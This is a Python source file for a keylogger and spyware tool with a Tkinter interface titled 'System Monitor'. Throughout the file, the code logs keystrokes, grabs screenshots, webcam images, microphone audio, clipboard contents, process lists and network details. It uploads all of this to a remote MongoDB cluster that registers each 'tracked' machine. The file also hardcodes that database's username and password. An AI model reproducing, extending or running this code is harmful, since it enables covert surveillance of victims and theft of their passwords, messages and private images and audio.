import os
import sys
import subprocess
import socket
import platform
import uuid
import threading
import time
import json
import base64
import io
import tkinter as tk
from tkinter import ttk, messagebox
import queue
from datetime import datetime
from pynput.keyboard import Key, Listener
import pymongo
from pymongo import MongoClient
import pathlib

# MongoDB connection string
MONGO_URI = "mongodb+srv://rounakchatterjee501:rounak501@cluster0.zouzehl.mongodb.net/"
DB_NAME = "keylogger_db"

# Global variables
log_queue = queue.Queue()
active = False
user_id = None
log_path = os.path.join(os.environ.get('USERPROFILE', ''), 'Documents', 'SystemLogs')

# Process tracking
threads = []

# Optional imports with fallbacks
try:
    from PIL import ImageGrab
    screenshots_enabled = True
except ImportError:
    screenshots_enabled = False
    print("PIL not available - screenshots disabled")

try:
    import cv2
    webcam_enabled = True
except ImportError:
    webcam_enabled = False
    print("OpenCV not available - webcam capture disabled")

try:
    import sounddevice
    from scipy.io.wavfile import write as write_rec
    microphone_enabled = True
except ImportError:
    microphone_enabled = False
    print("Audio recording libraries not available - microphone recording disabled")

class KeyloggerApp:
    def __init__(self, root):
        self.root = root
        self.root.title("System Monitor")
        self.root.geometry("450x500")
        self.root.resizable(False, False)
        
        # Apply some styling
        self.style = ttk.Style()
        self.style.configure("TButton", padding=6, relief="flat",
                             background="#ccc")
        self.style.configure("Green.TLabel", foreground="green")
        self.style.configure("Red.TLabel", foreground="red")
        
        # Main frame
        self.main_frame = ttk.Frame(root, padding="20")
        self.main_frame.pack(fill=tk.BOTH, expand=True)
        
        # Title
        title_label = ttk.Label(self.main_frame, text="Advanced System Monitor", 
                                font=("Arial", 14, "bold"))
        title_label.pack(pady=(0, 15))
        
        # Status indicator
        self.status_frame = ttk.LabelFrame(self.main_frame, text="Status")
        self.status_frame.pack(fill=tk.X, padx=10, pady=10)
        
        self.status_label = ttk.Label(self.status_frame, text="Inactive", 
                                    style="Red.TLabel", font=("Arial", 10, "bold"))
        self.status_label.pack(padx=10, pady=10)
        
        # Controls
        self.control_frame = ttk.LabelFrame(self.main_frame, text="Controls")
        self.control_frame.pack(fill=tk.X, padx=10, pady=10)
        
        self.start_btn = ttk.Button(self.control_frame, text="Start Monitoring", 
                                   command=self.start_monitoring)
        self.start_btn.pack(fill=tk.X, padx=10, pady=5)
        
        self.stop_btn = ttk.Button(self.control_frame, text="Stop Monitoring", 
                                  command=self.stop_monitoring, state=tk.DISABLED)
        self.stop_btn.pack(fill=tk.X, padx=10, pady=5)
        
        # Options frame
        self.options_frame = ttk.LabelFrame(self.main_frame, text="Monitoring Options")
        self.options_frame.pack(fill=tk.X, padx=10, pady=10)
        
        # Checkboxes for options
        self.keylog_var = tk.BooleanVar(value=True)
        self.screenshot_var = tk.BooleanVar(value=screenshots_enabled)
        self.webcam_var = tk.BooleanVar(value=webcam_enabled)
        self.mic_var = tk.BooleanVar(value=microphone_enabled)
        self.system_var = tk.BooleanVar(value=True)
        self.browser_var = tk.BooleanVar(value=True)
        
        # First column
        options_col1 = ttk.Frame(self.options_frame)
        options_col1.pack(side=tk.LEFT, fill=tk.BOTH, expand=True, padx=5, pady=5)
        
        self.keylog_check = ttk.Checkbutton(options_col1, text="Keyboard Logging", 
                                           variable=self.keylog_var)
        self.keylog_check.grid(row=0, column=0, sticky=tk.W, padx=5, pady=2)
        
        self.screenshot_check = ttk.Checkbutton(options_col1, text="Screenshots", 
                                              variable=self.screenshot_var, 
                                              state=tk.NORMAL if screenshots_enabled else tk.DISABLED)
        self.screenshot_check.grid(row=1, column=0, sticky=tk.W, padx=5, pady=2)
        
        self.webcam_check = ttk.Checkbutton(options_col1, text="Webcam Capture", 
                                          variable=self.webcam_var,
                                          state=tk.NORMAL if webcam_enabled else tk.DISABLED)
        self.webcam_check.grid(row=2, column=0, sticky=tk.W, padx=5, pady=2)
        
        # Second column
        options_col2 = ttk.Frame(self.options_frame)
        options_col2.pack(side=tk.RIGHT, fill=tk.BOTH, expand=True, padx=5, pady=5)
        
        self.mic_check = ttk.Checkbutton(options_col2, text="Microphone", 
                                       variable=self.mic_var,
                                       state=tk.NORMAL if microphone_enabled else tk.DISABLED)
        self.mic_check.grid(row=0, column=0, sticky=tk.W, padx=5, pady=2)
        
        self.system_check = ttk.Checkbutton(options_col2, text="System Info", 
                                          variable=self.system_var)
        self.system_check.grid(row=1, column=0, sticky=tk.W, padx=5, pady=2)
        
        self.browser_check = ttk.Checkbutton(options_col2, text="App Usage", 
                                           variable=self.browser_var)
        self.browser_check.grid(row=2, column=0, sticky=tk.W, padx=5, pady=2)
        
        # Log output area
        self.log_frame = ttk.LabelFrame(self.main_frame, text="Activity Log")
        self.log_frame.pack(fill=tk.BOTH, expand=True, padx=10, pady=10)
        
        self.log_text = tk.Text(self.log_frame, height=10, width=40, 
                              font=("Consolas", 9))
        self.log_text.pack(fill=tk.BOTH, expand=True, padx=5, pady=5)
        self.log_text.config(state=tk.DISABLED)
        
        # Scrollbar for log
        self.scrollbar = ttk.Scrollbar(self.log_text, command=self.log_text.yview)
        self.log_text.configure(yscrollcommand=self.scrollbar.set)
        self.scrollbar.pack(side=tk.RIGHT, fill=tk.Y)
        
        # Start log consumer thread
        self.log_thread = threading.Thread(target=self.consume_logs, daemon=True)
        self.log_thread.start()
        
        # Add a closing protocol
        self.root.protocol("WM_DELETE_WINDOW", self.on_closing)
        
        # Display startup information
        self.log_message("System Monitor started")
        self.log_message(f"Log directory: {log_path}")
        if not screenshots_enabled:
            self.log_message("WARNING: Screenshots disabled - PIL not installed")
        if not webcam_enabled:
            self.log_message("WARNING: Webcam disabled - OpenCV not installed")
        if not microphone_enabled:
            self.log_message("WARNING: Microphone disabled - Audio libraries not installed")
        
    def on_closing(self):
        """Handle window close event"""
        global active
        if active:
            if messagebox.askyesno("Confirmation", 
                                 "Monitoring is still active. Do you want to stop it and exit?"):
                self.stop_monitoring()
                self.root.destroy()
        else:
            self.root.destroy()
    
    def log_message(self, message):
        """Add a message to the log queue"""
        timestamp = datetime.now().strftime("%H:%M:%S")
        log_entry = f"[{timestamp}] {message}"
        log_queue.put(log_entry)
    
    def consume_logs(self):
        """Consume log messages from the queue and display them"""
        while True:
            try:
                message = log_queue.get(timeout=0.1)
                self.log_text.config(state=tk.NORMAL)
                self.log_text.insert(tk.END, message + "\n")
                self.log_text.see(tk.END)
                self.log_text.config(state=tk.DISABLED)
                log_queue.task_done()
            except queue.Empty:
                time.sleep(0.1)
            except Exception as e:
                print(f"Error in log consumer: {str(e)}")
    
    def start_monitoring(self):
        """Start the monitoring processes"""
        global active, threads, user_id
        
        if active:
            return
            
        try:
            # Ensure log directory exists
            pathlib.Path(log_path).mkdir(parents=True, exist_ok=True)
            
            # Test MongoDB connection
            self.log_message("Testing database connection...")
            try:
                client = MongoClient(MONGO_URI, serverSelectionTimeoutMS=5000)
                client.server_info()  # Will throw exception if connection fails
                
                # Register the user/system
                hostname = socket.gethostname()
                ip_address = socket.gethostbyname(hostname)
                os_info = platform.platform()
                
                # Generate or retrieve user_id
                user_id = self.register_user(hostname, ip_address, os_info)
                if not user_id:
                    self.log_message("Failed to register with database, using local mode")
                    user_id = f"local_{hostname}_{str(uuid.uuid4())[:8]}"
                    
                self.log_message(f"Connected to MongoDB database")
            except Exception as e:
                self.log_message(f"Database connection error: {str(e)}")
                self.log_message("Continuing in local mode")
                hostname = socket.gethostname()
                user_id = f"local_{hostname}_{str(uuid.uuid4())[:8]}"
                
            # Start selected monitoring processes
            active = True
            
            # Update UI
            self.status_label.config(text="Active - Monitoring", style="Green.TLabel")
            self.start_btn.config(state=tk.DISABLED)
            self.stop_btn.config(state=tk.NORMAL)
            
            # Disable checkboxes
            for check in [self.keylog_check, self.screenshot_check, self.webcam_check, 
                          self.mic_check, self.system_check, self.browser_check]:
                check.config(state=tk.DISABLED)
            
            # Start the appropriate threads based on selected options
            threads = []
            
            if self.system_var.get():
                # Collect system info right away
                self.log_message("Collecting system information...")
                system_thread = threading.Thread(target=collect_system_info, daemon=True)
                system_thread.start()
                threads.append(system_thread)
            
            if self.browser_var.get():
                # Collect app usage right away
                self.log_message("Collecting application usage data...")
                browser_thread = threading.Thread(target=collect_app_usage, daemon=True)
                browser_thread.start()
                threads.append(browser_thread)
            
            if self.keylog_var.get():
                self.log_message("Starting keylogger...")
                keylog_thread = threading.Thread(target=logg_keys, daemon=True)
                keylog_thread.start()
                threads.append(keylog_thread)
            
            if self.screenshot_var.get() and screenshots_enabled:
                self.log_message("Starting screenshot capture...")
                screenshot_thread = threading.Thread(target=capture_screenshots, daemon=True)
                screenshot_thread.start()
                threads.append(screenshot_thread)
            
            if self.mic_var.get() and microphone_enabled:
                self.log_message("Starting microphone recording...")
                mic_thread = threading.Thread(target=record_microphone, daemon=True)
                mic_thread.start()
                threads.append(mic_thread)
            
            if self.webcam_var.get() and webcam_enabled:
                self.log_message("Starting webcam capture...")
                webcam_thread = threading.Thread(target=capture_webcam, daemon=True)
                webcam_thread.start()
                threads.append(webcam_thread)
                
            self.log_message(f"Monitoring active for system ID: {user_id}")
            
        except Exception as e:
            messagebox.showerror("Error", f"Failed to start monitoring: {str(e)}")
            self.log_message(f"Error: {str(e)}")
    
    def stop_monitoring(self):
        """Stop all monitoring processes"""
        global active, threads
        
        if not active:
            return
            
        try:
            # Signal threads to stop
            active = False
            
            # Wait a moment for threads to clean up
            time.sleep(1)
            threads = []
            
            # Update UI
            self.status_label.config(text="Inactive", style="Red.TLabel")
            self.start_btn.config(state=tk.NORMAL)
            self.stop_btn.config(state=tk.DISABLED)
            
            # Re-enable checkboxes with appropriate states
            self.keylog_check.config(state=tk.NORMAL)
            self.system_check.config(state=tk.NORMAL)
            self.browser_check.config(state=tk.NORMAL)
            self.screenshot_check.config(state=tk.NORMAL if screenshots_enabled else tk.DISABLED)
            self.webcam_check.config(state=tk.NORMAL if webcam_enabled else tk.DISABLED)
            self.mic_check.config(state=tk.NORMAL if microphone_enabled else tk.DISABLED)
                
            self.log_message("Monitoring stopped")
            
        except Exception as e:
            messagebox.showerror("Error", f"Failed to stop monitoring: {str(e)}")
            self.log_message(f"Error: {str(e)}")
    
    def register_user(self, hostname, ip_address, os_info):
        """Register the system with MongoDB and get a user_id"""
        try:
            client = MongoClient(MONGO_URI, serverSelectionTimeoutMS=5000)
            db = client[DB_NAME]
            users_collection = db["tracked_users"]
            
            # Check if this hostname is already registered
            existing_user = users_collection.find_one({"hostname": hostname})
            
            if existing_user:
                return existing_user["user_id"]
            
            # Generate a new user_id
            user_id = str(uuid.uuid4())
            
            # Insert new user record
            user_data = {
                "user_id": user_id,
                "hostname": hostname,
                "ip_address": ip_address,
                "os_info": os_info,
                "first_seen": datetime.now(),
                "last_active": datetime.now()
            }
            
            users_collection.insert_one(user_data)
            return user_id
            
        except Exception as e:
            self.log_message(f"Error registering system: {str(e)}")
            return None

# Function to log keystrokes
def logg_keys():
    """Log keystrokes to file and database"""
    keylog_file = os.path.join(log_path, 'keylog.txt')
    buffer = []
    last_upload_time = time.time()
    
    def on_press(key):
        if not active:
            return False  # Stop listener
        
        nonlocal buffer, last_upload_time
        try:
            # Format the current time
            current_time = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
            
            # Get key value
            key_char = key.char if hasattr(key, 'char') else str(key)
            key_entry = f'{current_time}: {key_char}'
            
            # Append to buffer
            buffer.append(key_entry)
            
            # Write to local file
            with open(keylog_file, 'a', encoding='utf-8') as f:
                f.write(key_entry + '\n')
            
            # Every 10 seconds or if buffer gets large, upload to DB
            if time.time() - last_upload_time > 10 or len(buffer) > 50:
                if user_id:
                    try:
                        save_keylog_to_db('\n'.join(buffer))
                    except:
                        # If DB upload fails, just continue
                        pass
                buffer = []
                last_upload_time = time.time()
            
        except Exception as e:
            log_queue.put(f"Keylogger error: {str(e)}")
    
    # Start listening for key presses
    with Listener(on_press=on_press) as listener:
        log_queue.put("Keylogger started")
        try:
            while active:
                time.sleep(0.1)
                if not active:
                    break
            listener.stop()
        except Exception as e:
            log_queue.put(f"Keylogger error: {str(e)}")

def capture_screenshots():
    """Take screenshots at regular intervals"""
    if not screenshots_enabled:
        log_queue.put("Screenshots disabled - PIL not installed")
        return
        
    try:
        screenshots_dir = os.path.join(log_path, 'Screenshots')
        pathlib.Path(screenshots_dir).mkdir(parents=True, exist_ok=True)
        
        count = 0
        
        while active:
            try:
                # Wait between screenshots
                for _ in range(20):  # 20 x 0.5 = 10 seconds
                    if not active:
                        return
                    time.sleep(0.5)
                
                # Capture the screen
                pic = ImageGrab.grab()
                timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
                pic_path = os.path.join(screenshots_dir, f'screenshot_{timestamp}.png')
                pic.save(pic_path)
                
                # Upload to MongoDB
                if user_id:
                    try:
                        save_screenshot_to_db(pic_path)
                    except:
                        # If DB upload fails, just continue with local storage
                        pass
                
                count += 1
                log_queue.put(f"Screenshot captured ({count})")
                
            except Exception as e:
                log_queue.put(f"Screenshot error: {str(e)}")
                time.sleep(10)  # Wait longer on error
                
    except Exception as e:
        log_queue.put(f"Screenshot process error: {str(e)}")

def record_microphone():
    """Record audio from microphone at intervals"""
    if not microphone_enabled:
        log_queue.put("Microphone recording disabled - required libraries not installed")
        return
        
    try:
        audio_dir = os.path.join(log_path, 'Audio')
        pathlib.Path(audio_dir).mkdir(parents=True, exist_ok=True)
        
        count = 0
        
        while active:
            try:
                # Wait between recordings
                for _ in range(30):  # 30 x 1 = 30 seconds
                    if not active:
                        return
                    time.sleep(1)
                
                # Set up recording parameters
                fs = 44100  # Sample rate
                seconds = 5  # Duration of recording
                
                log_queue.put("Recording audio...")
                
                # Record audio
                recording = sounddevice.rec(int(seconds * fs), samplerate=fs, channels=2)
                sounddevice.wait()  # Wait until recording is finished
                
                # Save the recording
                timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
                audio_path = os.path.join(audio_dir, f'mic_{timestamp}.wav')
                write_rec(audio_path, fs, recording)
                
                # Upload to MongoDB
                if user_id:
                    try:
                        save_audio_to_db(audio_path)
                    except:
                        # If DB upload fails, just continue with local storage
                        pass
                
                count += 1
                log_queue.put(f"Audio recorded ({count})")
                
            except Exception as e:
                log_queue.put(f"Microphone error: {str(e)}")
                time.sleep(30)  # Wait longer on error
                
    except Exception as e:
        log_queue.put(f"Microphone process error: {str(e)}")

def capture_webcam():
    """Capture images from webcam at intervals"""
    if not webcam_enabled:
        log_queue.put("Webcam capture disabled - OpenCV not installed")
        return
        
    try:
        webcam_dir = os.path.join(log_path, 'Webcam')
        pathlib.Path(webcam_dir).mkdir(parents=True, exist_ok=True)
        
        count = 0
        
        # Try to open the webcam
        cam = cv2.VideoCapture(0)
        if not cam.isOpened():
            log_queue.put("Could not access webcam")
            return
            
        while active:
            try:
                # Wait between captures
                for _ in range(40):  # 40 x 0.5 = 20 seconds
                    if not active:
                        cam.release()
                        return
                    time.sleep(0.5)
                
                # Capture frame from webcam
                ret, img = cam.read()
                if not ret:
                    log_queue.put("Failed to capture webcam image")
                    time.sleep(10)
                    continue
                    
                # Save the image
                timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
                img_path = os.path.join(webcam_dir, f'webcam_{timestamp}.jpg')
                cv2.imwrite(img_path, img)
                
                # Upload to MongoDB
                if user_id:
                    try:
                        save_webcam_to_db(img_path)
                    except:
                        # If DB upload fails, just continue with local storage
                        pass
                
                count += 1
                log_queue.put(f"Webcam image captured ({count})")
                
            except Exception as e:
                log_queue.put(f"Webcam error: {str(e)}")
                time.sleep(20)  # Wait longer on error
                
        # Release the webcam
        cam.release()
            
    except Exception as e:
        log_queue.put(f"Webcam process error: {str(e)}")

def collect_system_info():
    """Collect system information"""
    try:
        system_info = {}
        
        # Get basic system info
        system_info["hostname"] = socket.gethostname()
        system_info["ip_address"] = socket.gethostbyname(system_info["hostname"])
        
        try:
            # Try to get public IP
            import requests
            system_info["public_ip"] = requests.get('https://api.ipify.org', timeout=5).text
        except:
            system_info["public_ip"] = "Could not determine"
            
        system_info["os"] = platform.system()
        system_info["os_release"] = platform.release()
        system_info["os_version"] = platform.version()
        system_info["architecture"] = platform.machine()
        system_info["processor"] = platform.processor()
        
        # Get network interfaces
        system_info["network_info"] = {}
        try:
            if platform.system() == "Windows":
                # Run ipconfig command and capture output
                ipconfig = subprocess.check_output("ipconfig /all", shell=True).decode('utf-8', errors='ignore')
                system_info["network_info"]["ipconfig"] = ipconfig
            else:
                # For Unix systems
                ifconfig = subprocess.check_output("ifconfig || ip addr", shell=True).decode('utf-8', errors='ignore')
                system_info["network_info"]["interfaces"] = ifconfig
        except:
            system_info["network_info"]["interfaces"] = "Failed to retrieve"
            
        # Get running processes
        system_info["processes"] = {}
        try:
            if platform.system() == "Windows":
                # Run tasklist command and capture output
                tasklist = subprocess.check_output("tasklist", shell=True).decode('utf-8', errors='ignore')
                system_info["processes"]["list"] = tasklist
            else:
                # For Unix systems
                processes = subprocess.check_output("ps aux", shell=True).decode('utf-8', errors='ignore')
                system_info["processes"]["list"] = processes
        except:
            system_info["processes"]["list"] = "Failed to retrieve"
        
        # Get clipboard content (Windows only)
        system_info["clipboard"] = {}
        try:
            if platform.system() == "Windows":
                # Use tkinter to get clipboard content
                root = tk.Tk()
                root.withdraw()
                clipboard_data = root.clipboard_get()
                root.destroy()
                system_info["clipboard"]["text"] = clipboard_data
            else:
                system_info["clipboard"]["text"] = "Not available on this platform"
        except:
            system_info["clipboard"]["text"] = "Failed to retrieve"
        
        # Save to local file
        system_info_path = os.path.join(log_path, 'system_info.json')
        with open(system_info_path, 'w', encoding='utf-8') as f:
            json.dump(system_info, f, indent=2)
        
        # Upload to MongoDB
        if user_id:
            try:
                save_system_info_to_db(system_info)
            except:
                # If DB upload fails, just continue with local storage
                pass
            
        log_queue.put("System information collected and saved")
        
        return system_info
        
    except Exception as e:
        log_queue.put(f"System info collection error: {str(e)}")
        return None

def collect_app_usage():
    """Collect application usage data"""
    try:
        app_dir = os.path.join(log_path, 'AppUsage')
        pathlib.Path(app_dir).mkdir(parents=True, exist_ok=True)
        
        while active:
            try:
                app_usage = {}
                
                # Get current running applications
                if platform.system() == "Windows":
                    try:
                        output = subprocess.check_output("tasklist /v", shell=True).decode('utf-8', errors='ignore')
                        app_usage["running_apps"] = output
                    except:
                        app_usage["running_apps"] = "Failed to retrieve"
                else:
                    try:
                        output = subprocess.check_output("ps aux", shell=True).decode('utf-8', errors='ignore')
                        app_usage["running_apps"] = output
                    except:
                        app_usage["running_apps"] = "Failed to retrieve"
                
                # Try to get browser history information if possible
                if platform.system() == "Windows":
                    try:
                        # Check common browser paths
                        browser_info = {
                            "chrome_installed": os.path.exists(os.path.join(os.environ.get("LOCALAPPDATA", ""), "Google", "Chrome")),
                            "firefox_installed": os.path.exists(os.path.join(os.environ.get("APPDATA", ""), "Mozilla", "Firefox")),
                            "edge_installed": os.path.exists(os.path.join(os.environ.get("LOCALAPPDATA", ""), "Microsoft", "Edge")),
                        }
                        app_usage["browser_info"] = browser_info
                    except:
                        app_usage["browser_info"] = "Failed to retrieve"
                
                # Save the app usage data
                timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
                app_usage_path = os.path.join(app_dir, f'app_usage_{timestamp}.json')
                with open(app_usage_path, 'w', encoding='utf-8') as f:
                    json.dump(app_usage, f, indent=2)
                
                # Upload to MongoDB
                if user_id:
                    try:
                        save_app_usage_to_db(app_usage)
                    except:
                        # If DB upload fails, just continue with local storage
                        pass
                    
                log_queue.put("Application usage data collected")
                
                # Wait for a while before collecting again
                for _ in range(120):  # 120 x 0.5 = 60 seconds
                    if not active:
                        return
                    time.sleep(0.5)
                    
            except Exception as e:
                log_queue.put(f"App usage collection error: {str(e)}")
                time.sleep(60)  # Wait longer on error
                
    except Exception as e:
        log_queue.put(f"App usage process error: {str(e)}")

# MongoDB functions
def save_keylog_to_db(keylog_text):
    """Save keylog data to MongoDB"""
    try:
        if not user_id:
            return False
            
        client = MongoClient(MONGO_URI, serverSelectionTimeoutMS=5000)
        db = client[DB_NAME]
        keylogs_collection = db["key_logs"]
        
        document = {
            "user_id": user_id,
            "timestamp": datetime.now(),
            "keylog_data": keylog_text
        }
        
        keylogs_collection.insert_one(document)
        
        # Update user's last active timestamp
        db["tracked_users"].update_one(
            {"user_id": user_id},
            {"$set": {"last_active": datetime.now()}}
        )
        
        return True
    except Exception as e:
        log_queue.put(f"Error saving keylog to database: {str(e)}")
        return False

def save_screenshot_to_db(image_path):
    """Save screenshot to MongoDB"""
    try:
        if not user_id:
            return False
            
        client = MongoClient(MONGO_URI, serverSelectionTimeoutMS=5000)
        db = client[DB_NAME]
        screenshots_collection = db["screenshots"]
        
        # Read the image file
        with open(image_path, "rb") as img_file:
            img_data = img_file.read()
        
        document = {
            "user_id": user_id,
            "timestamp": datetime.now(),
            "image_data": img_data
        }
        
        screenshots_collection.insert_one(document)
        
        # Update user's last active timestamp
        db["tracked_users"].update_one(
            {"user_id": user_id},
            {"$set": {"last_active": datetime.now()}}
        )
        
        return True
    except Exception as e:
        log_queue.put(f"Error saving screenshot to database: {str(e)}")
        return False

def save_webcam_to_db(image_path):
    """Save webcam picture to MongoDB"""
    try:
        if not user_id:
            return False
            
        client = MongoClient(MONGO_URI, serverSelectionTimeoutMS=5000)
        db = client[DB_NAME]
        webcam_collection = db["webcam_pics"]
        
        # Read the image file
        with open(image_path, "rb") as img_file:
            img_data = img_file.read()
        
        document = {
            "user_id": user_id,
            "timestamp": datetime.now(),
            "image_data": img_data
        }
        
        webcam_collection.insert_one(document)
        
        # Update user's last active timestamp
        db["tracked_users"].update_one(
            {"user_id": user_id},
            {"$set": {"last_active": datetime.now()}}
        )
        
        return True
    except Exception as e:
        log_queue.put(f"Error saving webcam picture to database: {str(e)}")
        return False

def save_audio_to_db(audio_path):
    """Save audio recording to MongoDB"""
    try:
        if not user_id:
            return False
            
        client = MongoClient(MONGO_URI, serverSelectionTimeoutMS=5000)
        db = client[DB_NAME]
        mic_collection = db["mic_recordings"]
        
        # Read the audio file
        with open(audio_path, "rb") as audio_file:
            audio_data = audio_file.read()
        
        document = {
            "user_id": user_id,
            "timestamp": datetime.now(),
            "audio_data": audio_data
        }
        
        mic_collection.insert_one(document)
        
        # Update user's last active timestamp
        db["tracked_users"].update_one(
            {"user_id": user_id},
            {"$set": {"last_active": datetime.now()}}
        )
        
        return True
    except Exception as e:
        log_queue.put(f"Error saving audio recording to database: {str(e)}")
        return False

def save_system_info_to_db(system_info):
    """Save system information to MongoDB"""
    try:
        if not user_id:
            return False
            
        client = MongoClient(MONGO_URI, serverSelectionTimeoutMS=5000)
        db = client[DB_NAME]
        system_info_collection = db["system_info"]
        
        # Check if we already have system info for this user
        existing = system_info_collection.find_one({"user_id": user_id})
        
        if existing:
            # Update existing record
            system_info_collection.update_one(
                {"user_id": user_id},
                {
                    "$set": {
                        "system_info": system_info,
                        "updated_at": datetime.now()
                    }
                }
            )
        else:
            # Create new record
            document = {
                "user_id": user_id,
                "system_info": system_info,
                "created_at": datetime.now(),
                "updated_at": datetime.now()
            }
            system_info_collection.insert_one(document)
            
        # Update user's last active timestamp
        db["tracked_users"].update_one(
            {"user_id": user_id},
            {"$set": {"last_active": datetime.now()}}
        )
        
        return True
    except Exception as e:
        log_queue.put(f"Error saving system info to database: {str(e)}")
        return False

def save_app_usage_to_db(app_usage_data):
    """Save application usage to MongoDB"""
    try:
        if not user_id:
            return False
            
        client = MongoClient(MONGO_URI, serverSelectionTimeoutMS=5000)
        db = client[DB_NAME]
        app_usage_collection = db["app_usage"]
        
        document = {
            "user_id": user_id,
            "timestamp": datetime.now(),
            "app_data": app_usage_data
        }
        
        app_usage_collection.insert_one(document)
        
        # Update user's last active timestamp
        db["tracked_users"].update_one(
            {"user_id": user_id},
            {"$set": {"last_active": datetime.now()}}
        )
        
        return True
    except Exception as e:
        log_queue.put(f"Error saving app usage to database: {str(e)}")
        return False

# Main function
def main():
    root = tk.Tk()
    app = KeyloggerApp(root)
    root.mainloop()

if __name__ == "__main__":
    main()